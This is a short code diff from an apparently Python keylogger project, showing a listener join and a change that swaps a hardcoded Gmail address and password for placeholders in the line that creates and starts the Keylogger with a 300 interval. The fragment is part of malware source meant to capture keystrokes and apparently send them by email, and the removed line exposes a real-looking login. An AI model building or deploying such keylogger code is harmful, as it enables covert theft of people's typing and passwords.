@@ -46,5 +46,5 @@ class Keylogger:
             keyboard_listener.join()
 
 
-mykey_logger = Keylogger(300, "nicenoob247@gmail.com", "nicenoob1234")
+mykey_logger = Keylogger(300, "Your Gmail", "Password")
 mykey_logger.start()
